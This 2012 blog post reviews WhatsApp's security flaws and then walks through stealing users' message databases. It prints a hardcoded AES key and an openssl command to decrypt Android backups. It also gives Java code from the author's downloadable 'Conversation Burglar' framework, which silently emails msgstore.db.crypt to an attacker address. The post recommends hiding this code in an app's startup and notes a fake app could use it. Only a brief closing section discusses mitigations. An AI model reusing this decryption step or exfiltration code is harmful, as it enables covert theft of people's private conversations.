---
date: '2012-12-21T15:22:00+00:00'
draft: false
slug: leaking-whatsapp-stealing-conversations-silently
title: Leaking Whatsapp - stealing conversations silently
---

<p style="text-align: center;"><a href="#" rel="attachment wp-att-172"><img class="aligncenter  wp-image-172" alt="bug-big" src="/wp-content/uploads/2012/12/bug-big.png" width="210" height="210" /></a></p>
Whatsapp, the fast-growing mobile messaging service, is the main threat to the (outdated) business model of telecommunications operators. Its exponential numbers confirm that telcos react late and badly: Whatsapp has taken a position that will be hard to unthrone. The only apparent risk lies in other companies using the same concept of Push notifications: recently, Line appears to claim some users by adding more functionalities.

Business aside, it is amazing to see how the security in Whatsapp is nonexistent. In an attempt to be moderate, I will simply say that using the word "security" is a misinformed statement. Being aggressive, I would use other words.

In May 2011, there was a <a href="http://thenextweb.com/apps/2011/05/23/signup-goof-leaves-whatsapp-users-open-to-account-hijacking/" target="_blank">reported bug</a> which left user accounts open for hijacking. This was the first public one. Since then, it was reported that communications within WhatsApp were not encrypted, with the data being sent and received in plaintext. This allowed any person to intercept messages by connecting to the same WiFi as the target phone (an <a href="http://whatsapp-sniffer.beepworld.de/" target="_blank">application for Android</a> was even published on the market, although it was removed after a few weeks by Google). In May 2012 the bug was reported to be fixed, although it took one year to implement a fix that is <a href="http://stackoverflow.com/questions/4319496/how-to-encrypt-and-decrypt-data-in-java" target="_blank">not especially complex</a>.

In September 2011, a new version of WhatsApp allowed forged messages to be sent and messages from any WhatsApp user to be <a href="http://www.securitybydefault.com/2012/09/whatsapp-spam-inundacion-y-robo-de.html" target="_blank">read</a>.

On January 6, 2012, an unknown <a href="http://tweakers.net/nieuws/79321/whatsapp-status-van-anderen-is-nog-steeds-te-wijzigen.html" target="_blank">hacker published a website</a> which made it possible to change the status of an arbitrary WhatsApp user, as long as the phone number was known. This bug was reported as fixed on January 9... but the only measure that was taken was blocking the website's IP address. As a reaction, a Windows tool was made available for download providing the same functionality. This issue has not been resolved until now.

On January 13, 2012, Whatsapp was pulled from the iOS App Store for an <a href="http://tecnologia.elpais.com/tecnologia/2012/07/03/actualidad/1341340111_145629.html" target="_blank">undisclosed reason</a>. The app was added back to the App Store 4 days later. German Tech blog <a href="http://www.h-online.com/security/news/item/WhatsApp-accounts-almost-completely-unprotected-1708545.html" target="_blank">The H</a> demonstrated how to hijack any WhatsApp account on September 14, 2012. WhatsApp reacted with a legal threat to <a href="http://www.h-online.com/security/news/item/WhatsApp-threatens-legal-action-against-API-developers-1716912.html" target="_blank">WhatsAPI's developers</a>.

The last unassailable bastion was the local database of messages, since it was physically stored in the device and we would need access to it... in theory. Let's show how we can achieve this. In most cases it is possible to obtain the WhatsApp message history from an encrypted device or backup; for details, read this paper: <a href="https://www.os3.nl/_media/2011-2012/students/ssn_project_report.pdf">WhatsApp Database Encryption Project Report</a>

Summarizing: The database containing all the WhatsApp messages is stored in a SQLite file format. For iOS phones, this file is in the path: [App ID] / Documents / ChatStorage.sqlite, and in the case of Android phones, at / com.whatsapp / databases / msgstore.db. This file is unencrypted, and this requires the phone to be jailbroken. In Android, the backup file is stored in the external memory card and was also not encrypted. This changed in one application update, and now, if the phone is lost or stolen, the messages cannot be read.

Unfortunately, the application uses the same key for the encryption (AES-192-ECB) (346a23652a46392b4d73257c67317e352e3372482177652c), and there is no use of entropy or unique factors for each device, so the database can be unencrypted within a matter of seconds.
```bash
openssl enc -d  -aes-192-ecb -in msgstore-1.db.crypt -out msgstore.db.sqlite -K346a23652a46392b4d73257c67317e352e3372482177652c
```
&nbsp;

So, we know how to break the encryption. Now we have to solve the problem of having access to the device.

Android uses permissions to determine what applications can do when they are installed on the device. In order to read from the external storage, we need to use the permission <strong>android.permission.WRITE_EXTERNAL_STORAGE</strong>. By using this, we will be able to access all the files within the SDCard. Surprisingly, WhatsApp developers didn't use the internal storage for the application, which would have prevented any application from stealing its data.

Now that we can access the data, we need to send it somewhere else. By default, Android allows us to use Intents in order to send emails. But this is not transparent at all: the user will be able to see that we are trying to send an email to an unknown email address, and this action will be canceled. But we can use some other techniques. For example, we could use a transparent layer, connect to a mail server without triggering user perception, and acquire the file with the precious information.

I have developed a framework (WhatsApp Conversation Burglar) that can be included within an Android application to steal the data without the user knowing it. You can download it from <a href="https://github.com/kikoso/whatsapp-conversation-burglar" target="_blank">here</a>.

Let's see how it works:

The framework presents a dummy Activity (MailSenderActivity), with only a button. We have the following listener when the button is clicked:
```java
 public void onClick(View v) {
            	try {   
                	AsyncTask<Void, Void, Void> m = new AsyncTask<Void, Void, Void>() {

						@Override
						protected Void doInBackground(Void... arg0) {
							GMailSender sender = new GMailSender(EMAIL_STRING, PASSWORD_STRING);
		                    try {
		                    	sender.addAttachment("/storage/sdcard0/WhatsApp/Databases/msgstore.db.crypt", SUBJECT_STRING);
								sender.sendMail(SUBJECT_STRING,   
								        BODY_STRING,   
								        EMAIL_STRING,   
								        RECIPIENT_STRING);
							} catch (Exception e) {
								e.printStackTrace();
							}   
							return null;
						}
                	};
                	m.execute((Void)null);
                } catch (Exception e) {   
                    DebugLog.e("SendMail", e.getMessage());   
                } 
            }
        });
```
This section of code initializes a GMailSender object with some parameters. The function _addAttachment()_ attaches a target file to be sent (in our case, it is the database containing all the WhatsApp messages) and a subject to the email. The function _sendMail()_ just sends the email with the required information (SUBJECT_STRING, BODY_STRING, EMAIL_STRING, RECIPIENT_STRING). The class GMailSender is the object responsible for all the email communication, using the JavaMail library. The code is self-explanatory.

By setting the right parameters, the file with all the conversations is sent to the provided email address, where we can decrypt it by using the line I provided earlier in the terminal. If you want to use this framework in your application, you only have to add it as a library and include the code within the application (probably in the onCreate() method of the first activity triggered, so you make sure the conversations are stolen when the application starts). A fake application could include this framework and steal all the conversations from the users installing it

There is no way to prevent this error other than removing the file with all the conversations. WhatsApp could use a different kind of encryption (using data such as device IMEI, UNIX time of installation, or any non-replicable information), or just move it to the private application folder (/data/data/com.package.name/). But considering their tragic history with security, we probably cannot rely on this.

If you have any comments about the previous post, feel free to contact me <a href="mailto:eenriquelopez@gmail.com">by email</a>.

&nbsp;

Enrique López-Mañas